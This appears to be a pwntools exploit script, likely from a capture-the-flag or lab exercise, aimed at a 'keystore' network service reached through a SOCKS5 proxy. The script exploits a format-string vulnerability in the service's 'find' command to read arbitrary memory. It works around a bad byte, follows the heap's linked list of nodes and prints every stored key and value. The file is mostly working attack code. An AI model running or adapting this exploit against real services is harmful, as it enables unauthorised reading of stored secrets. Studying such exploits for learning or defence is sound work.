from pwn import *
import socks

context.proxy = (socks.SOCKS5, "127.0.0.1", 8123)
r = remote("192.168.2.199", 55733)
# r = gdb.debug("./keystore")
BAD_BYTE = 0x28

def send_find(p): r.sendlineafter(b">", b"find " + p); return r.recvline()

def safe_addr(addr):
    for d in [0, -1, -2, -3, -4]:
        raw = p32(addr+d)
        if BAD_BYTE not in raw: return raw, d
    raise ValueError(f"bad addr {hex(addr)}")

def leak(addr, n=4):
    raw, d = safe_addr(addr)
    line = send_find(b"AAA"+raw+b" %7$s").split(b":",1)[0]
    out  = line[3+4+1:]+b"\0"*n
    return out[-d:][:n]

leak_u32  = lambda a: u32(leak(a,4))
leak_str  = lambda a: leak(a,1024).split(b"\0",1)[0]

# --- exploit flow ---
first = send_find(b"AAABBBB %17$p")
next_node = int(first.split(b":",1)[0].split()[1],16)
log.success(f"head->next = {hex(next_node)}")

KEY, VAL, NXT = 0, 4, 8
for i in range(200):
    if not next_node: break
    try:
        kp,vp,np = [leak_u32(next_node+o) for o in (KEY,VAL,NXT)]
        log.success(f"node[{i}] @ {hex(next_node)}:")
        log.info(f"   key   = {hex(kp)} -> {leak_str(kp)!r}")
        log.info(f"   value = {hex(vp)} -> {leak_str(vp)!r}")
        log.info(f"   next  = {hex(np)}")
        next_node = np
    except Exception as e:
        log.warning(f"stop node[{i}] @ {hex(next_node)}: {e}")
        break

r.close()


"'0x98901b0'"